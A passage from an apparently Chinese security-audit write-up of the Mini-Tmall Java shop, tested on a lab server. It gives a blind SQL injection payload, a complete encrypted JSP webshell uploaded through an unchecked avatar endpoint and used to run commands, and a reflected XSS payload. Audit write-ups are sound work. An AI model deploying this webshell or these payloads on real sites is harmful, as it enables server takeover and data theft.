class="keyword">if</span> (reward_isEnabled_array != <span class="literal">null</span> &amp;&amp; (reward_isEnabled_array.length &lt;= <span class="number">0</span> || reward_isEnabled_array.length &gt;=<span class="number">3</span>)) &#123;</span><br><span class="line">        reward_isEnabled_array = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (reward_name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//如果为非空字符串则解决中文乱码：URLDecoder.decode(String,&quot;UTF-8&quot;);</span></span><br><span class="line">        reward_name = <span class="string">&quot;&quot;</span>.equals(reward_name) ? <span class="literal">null</span> : URLDecoder.decode(reward_name, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;&quot;</span>.equals(orderBy)) &#123;</span><br><span class="line">        orderBy = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//封装查询条件</span></span><br><span class="line">    <span class="type">Reward</span> <span class="variable">reward</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reward</span>()</span><br><span class="line">            .setReward_name(reward_name)</span><br><span class="line">            .setReward_lowest_amount(reward_lowest_amount)</span><br><span class="line">            .setReward_amount(reward_highest_amount);</span><br><span class="line">    <span class="type">OrderUtil</span> <span class="variable">orderUtil</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (orderBy != <span class="literal">null</span>) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;根据&#123;&#125;排序，是否倒序:&#123;&#125;&quot;</span>,orderBy,isDesc);</span><br><span class="line">        orderUtil = <span class="keyword">new</span> <span class="title class_">OrderUtil</span>(orderBy, isDesc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取第&#123;&#125;页的&#123;&#125;条打赏&quot;</span>, index + <span class="number">1</span>, count);</span><br><span class="line">    <span class="type">PageUtil</span> <span class="variable">pageUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PageUtil</span>(index, count);</span><br><span class="line">    List&lt;Reward&gt; rewardList = rewardService.getList(reward, reward_isEnabled_array, orderUtil, pageUtil);</span><br><span class="line">    object.put(<span class="string">&quot;rewardList&quot;</span>, JSONArray.parseArray(JSON.toJSONString(rewardList)));</span><br><span class="line">    logger.info(<span class="string">&quot;按条件获取打赏总条数&quot;</span>);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">rewardCount</span> <span class="operator">=</span> rewardService.getTotal(reward, reward_isEnabled_array);</span><br><span class="line">    object.put(<span class="string">&quot;rewardCount&quot;</span>, rewardCount);</span><br><span class="line">    logger.info(<span class="string">&quot;获取分页信息&quot;</span>);</span><br><span class="line">    pageUtil.setTotal(rewardCount);</span><br><span class="line">    object.put(<span class="string">&quot;totalPage&quot;</span>, pageUtil.getTotalPage());</span><br><span class="line">    object.put(<span class="string">&quot;pageUtil&quot;</span>, pageUtil);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​可见，代码逻辑也是相同的，所以这里直接构造payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">0.1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>​爆破得出数据。</p><p><img src="/img/Mini-Tmall/image-20241224210641485.png" alt="image-20241224210641485"></p><p>​导出数据后处理得到库名</p><p><img src="/img/Mini-Tmall/image-20241224210709442.png" alt="image-20241224210709442"></p><p>剩余的xml文件也是相同的漏洞，这里仅贴出，不做证明：</p><p>src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;ProductMapper.xml</p><p>src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper&#x2F;ProductOrderMapper.xml</p><h3 id="任意文件操控"><a href="#任意文件操控" class="headerlink" title="任意文件操控"></a>任意文件操控</h3><h4 id="src-main-java-com-xq-tmall-controller-fore-ForeUserController-java（成功）"><a href="#src-main-java-com-xq-tmall-controller-fore-ForeUserController-java（成功）" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;fore&#x2F;ForeUserController.java（成功）"></a>src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;fore&#x2F;ForeUserController.java（成功）</h4><p>​通过upload寻找文件上传的控制器，这里共有四个控制器实现了文件上传的功能，这里选择一个难度更低的方式，实际上四个文件上传的控制都存在相同的漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;user/uploadUserHeadImage&quot;, method = RequestMethod.POST, produces = &quot;application/json;charset=utf-8&quot;)</span></span><br><span class="line"><span class="keyword">public</span>  String <span class="title function_">uploadUserHeadImage</span><span class="params">(<span class="meta">@RequestParam</span> MultipartFile file, HttpSession session</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">originalFileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">    logger.info(<span class="string">&quot;获取图片原始文件名：&#123;&#125;&quot;</span>, originalFileName);</span><br><span class="line">    <span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> UUID.randomUUID() + extension;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> session.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;res/images/item/userProfilePicture/&quot;</span> + fileName;</span><br><span class="line">    logger.info(<span class="string">&quot;文件上传路径：&#123;&#125;&quot;</span>, filePath);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;文件上传中...&quot;</span>);</span><br><span class="line">        file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(filePath));</span><br><span class="line">        logger.info(<span class="string">&quot;文件上传成功！&quot;</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;success&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;fileName&quot;</span>, fileName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        logger.warn(<span class="string">&quot;文件上传失败！&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jsonObject.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ 这是一个用户头像的文件上传实现，这里审计代码我们可以发现，它将传入的文件名进行了修改，也就是说这里无法进行目录穿透，但是这里并没有对后缀的校验。所以这里是存在一个任意文件上传的，而且该项目也解析jsp，所以也可以传shell。我们定位到前端的头像更换功能点，随便传一个图片后，构造数据包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tmall/user/uploadUserHeadImage</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.53.85:8080</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.53.85:8080/tmall/userDetails</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryTAJAUStFnEcoK7fY</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.53.85:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=3B16C09E8A179A970E83C60845A3ED95; username=1209577113; admin-token=1#2F31733671566670654C7A6C432B6766575978556E4E58456F4554656B56596479727567522B483048444B544C5A4F5332736C4673556352716E516573486D535366716C76524751733336462F746D77657036476C516F4C493741783532773834364D74783071516B5079657A6856355766355970547677473254736F2F5165454A656B366857734474653154734B672F494A4A33773D3D</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2276</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">------WebKitFormBoundaryTAJAUStFnEcoK7fY</span></span><br><span class="line"><span class="language-gradle">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.jsp&quot;</span></span></span><br><span class="line"><span class="language-gradle">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">&lt;%@page <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle">    <span class="keyword">private</span> <span class="keyword">byte</span>[] Decrypt(<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="language-gradle">    &#123;</span></span><br><span class="line"><span class="language-gradle">        String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;</span></span><br><span class="line"><span class="language-gradle">        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> javax.crypto.spec.SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">byte</span>[] decodebs;</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">Class</span> baseCls ;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-gradle">                    baseCls=<span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">                    Object Decoder=baseCls.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="keyword">null</span>).invoke(baseCls, <span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle">                    decodebs=(<span class="keyword">byte</span>[]) Decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">byte</span>[].<span class="keyword">class</span>&#125;).invoke(Decoder, <span class="keyword">new</span> Object[]&#123;data&#125;);</span></span><br><span class="line"><span class="language-gradle">                &#125;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">catch</span> (Throwable e)</span></span><br><span class="line"><span class="language-gradle">                &#123;</span></span><br><span class="line"><span class="language-gradle">                    baseCls = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">                    Object Decoder=baseCls.newInstance();</span></span><br><span class="line"><span class="language-gradle">                    decodebs=(<span class="keyword">byte</span>[]) Decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>,<span class="keyword">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;).invoke(Decoder, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String(data)&#125;);</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">                &#125;</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">return</span> c.doFinal(decodebs);</span></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">    &#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%!<span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span> []b)&#123;<span class="keyword">return</span></span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span></span><br><span class="line"><span class="language-gradle">            ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">int</span> length=request.getInputStream().<span class="keyword">read</span>(buf);</span></span><br><span class="line"><span class="language-gradle">            <span class="keyword">while</span> (length&gt;<span class="number">0</span>)</span></span><br><span class="line"><span class="language-gradle">            &#123;</span></span><br><span class="line"><span class="language-gradle">                <span class="keyword">byte</span>[] data= Arrays.copyOfRange(buf,<span class="number">0</span>,length);</span></span><br><span class="line"><span class="language-gradle">                bos.<span class="keyword">write</span>(data);</span></span><br><span class="line"><span class="language-gradle">                length=request.getInputStream().<span class="keyword">read</span>(buf);</span></span><br><span class="line"><span class="language-gradle">            &#125;</span></span><br><span class="line"><span class="language-gradle">            <span class="comment">/* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            out.clear();</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            out=pageContext.pushBody();</span></span></span><br><span class="line"><span class="comment"><span class="language-gradle">            */</span></span></span><br><span class="line"><span class="language-gradle">            out.clear();</span></span><br><span class="line"><span class="language-gradle">            out=pageContext.pushBody();</span></span><br><span class="line"><span class="language-gradle">        <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">------WebKitFormBoundaryTAJAUStFnEcoK7fY--</span></span><br></pre></td></tr></table></figure><p>​发包后，得到图片的URL，访问这个jsp文件。</p><p><img src="/img/Mini-Tmall/image-20241224213640952.png" alt="image-20241224213640952"></p><p>​访问<a href="http://172.21.53.85:8080/tmall/res/images/item/userProfilePicture/248f1f1d-aad8-43f6-8147-e9fd780f7ed4.jsp">172.21.53.85:8080&#x2F;tmall&#x2F;res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;248f1f1d-aad8-43f6-8147-e9fd780f7ed4.jsp</a>，发现没有出现图片解析错误，或者将文件直接下载下来，也就是解析了jsp，使用冰蝎连接后，连接成功，执行calc命令，成功弹出计算机。</p><p><img src="/img/Mini-Tmall/image-20241224213823619.png" alt="image-20241224213823619"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;product&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">goToPage</span><span class="params">(HttpSession session, Map&lt;String, Object&gt; map,</span></span><br><span class="line"><span class="params">                       <span class="meta">@RequestParam(value = &quot;category_id&quot;, required = false)</span> Integer category_id<span class="comment">/* 分类ID */</span>,</span></span><br><span class="line"><span class="params">                       <span class="meta">@RequestParam(value = &quot;product_name&quot;, required = false)</span> String product_name<span class="comment">/* 产品名称 */</span>)</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;检查用户是否登录&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">userId</span> <span class="operator">=</span> checkUser(session);</span><br><span class="line">    <span class="keyword">if</span> (userId != <span class="literal">null</span>) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;获取用户信息&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.get(Integer.parseInt(userId.toString()));</span><br><span class="line">        map.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (category_id == <span class="literal">null</span> &amp;&amp; product_name == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (product_name != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;&quot;</span>.equals(product_name.trim())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;整合搜索信息&quot;</span>);</span><br><span class="line">    <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">searchValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">searchType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (category_id != <span class="literal">null</span>) &#123;</span><br><span class="line">        product.setProduct_category(<span class="keyword">new</span> <span class="title class_">Category</span>().setCategory_id(category_id));</span><br><span class="line">        searchType = category_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关键词数组</span></span><br><span class="line">    String[] product_name_split = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//产品列表</span></span><br><span class="line">    List&lt;Product&gt; productList;</span><br><span class="line">    <span class="comment">//产品总数量</span></span><br><span class="line">    Integer productCount;</span><br><span class="line">    <span class="comment">//分页工具</span></span><br><span class="line">    <span class="type">PageUtil</span> <span class="variable">pageUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PageUtil</span>(<span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> (product_name != <span class="literal">null</span>) &#123;</span><br><span class="line">        product_name_split = product_name.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        logger.info(<span class="string">&quot;提取的关键词有&#123;&#125;&quot;</span>, Arrays.toString(product_name_split));</span><br><span class="line">        product.setProduct_name(product_name);</span><br><span class="line">        searchValue = product_name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (product_name_split != <span class="literal">null</span> &amp;&amp; product_name_split.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;获取组合商品列表&quot;</span>);</span><br><span class="line">        productList = productService.getMoreList(product, <span class="keyword">new</span> <span class="title class_">Byte</span>[]&#123;<span class="number">0</span>, <span class="number">2</span>&#125;, <span class="literal">null</span>, pageUtil, product_name_split);</span><br><span class="line">        logger.info(<span class="string">&quot;按组合条件获取产品总数量&quot;</span>);</span><br><span class="line">        productCount = productService.getMoreListTotal(product, <span class="keyword">new</span> <span class="title class_">Byte</span>[]&#123;<span class="number">0</span>, <span class="number">2</span>&#125;, product_name_split);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;获取商品列表&quot;</span>);</span><br><span class="line">        productList = productService.getList(product, <span class="keyword">new</span> <span class="title class_">Byte</span>[]&#123;<span class="number">0</span>, <span class="number">2</span>&#125;, <span class="literal">null</span>, pageUtil);</span><br><span class="line">        logger.info(<span class="string">&quot;按条件获取产品总数量&quot;</span>);</span><br><span class="line">        productCount = productService.getTotal(product, <span class="keyword">new</span> <span class="title class_">Byte</span>[]&#123;<span class="number">0</span>, <span class="number">2</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;获取商品列表的对应信息&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Product p : productList) &#123;</span><br><span class="line">        p.setSingleProductImageList(productImageService.getList(p.getProduct_id(), (<span class="type">byte</span>) <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        p.setProduct_category(categoryService.get(p.getProduct_category().getCategory_id()));</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;获取分类列表&quot;</span>);</span><br><span class="line">    List&lt;Category&gt; categoryList = categoryService.getList(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">PageUtil</span>(<span class="number">0</span>, <span class="number">5</span>));</span><br><span class="line">    logger.info(<span class="string">&quot;获取分页信息&quot;</span>);</span><br><span class="line">    pageUtil.setTotal(productCount);</span><br><span class="line"></span><br><span class="line">    map.put(<span class="string">&quot;categoryList&quot;</span>, categoryList);</span><br><span class="line">    map.put(<span class="string">&quot;totalPage&quot;</span>, pageUtil.getTotalPage());</span><br><span class="line">    map.put(<span class="string">&quot;pageUtil&quot;</span>, pageUtil);</span><br><span class="line">    map.put(<span class="string">&quot;productList&quot;</span>, productList);</span><br><span class="line">    map.put(<span class="string">&quot;searchValue&quot;</span>, searchValue);</span><br><span class="line">    map.put(<span class="string">&quot;searchType&quot;</span>, searchType);</span><br><span class="line"></span><br><span class="line">    logger.info(<span class="string">&quot;转到前台天猫-产品搜索列表页&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fore/productListPage&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​该代码所实现功能为，前台的产品搜索功能，这里传入的搜索参数为product_name，审计我们可知，这里并未对product_name进行额外处理，也就是没有防御XSS。我们定位到前端，构造payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​输入搜索框后搜索。</p><p><img src="/img/Mini-Tmall/image-20241225111637196.png" alt="image-20241225111637196"></p><p>​成功触发反射型XSS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;admin/product/&#123;index&#125;/&#123;count&#125;&quot;, method = RequestMethod.GET, produces = &quot;application/json;charset=utf-8&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getProductBySearch</span><span class="params">(<span class="meta">@RequestParam(required = false)</span> String product_name<span class="comment">/* 产品名称 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Integer category_id<span class="comment">/* 产品类型ID */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Double product_sale_price<span class="comment">/* 产品促销价 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Double product_price<span class="comment">/* 产品原价 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> Byte[] product_isEnabled_array<span class="comment">/* 产品状态数组 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false)</span> String orderBy<span class="comment">/* 排序字段 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@RequestParam(required = false,defaultValue = &quot;true&quot;)</span> Boolean isDesc<span class="comment">/* 是否倒序 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@PathVariable</span> Integer index<span class="comment">/* 页数 */</span>,</span></span><br><span class="line"><span class="params">                                 <span class="meta">@PathVariable</span> Integer count<span class="comment">/* 行数 */</span>)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    <span class="comment">//移除不必要条件</span></span><br><span class="line">    <span class="keyword">if</span> (product_isEnabled_array != <span class="literal">null</span> &amp;&amp; (product_isEnabled_array.length &lt;= <span class="number">0</span> || 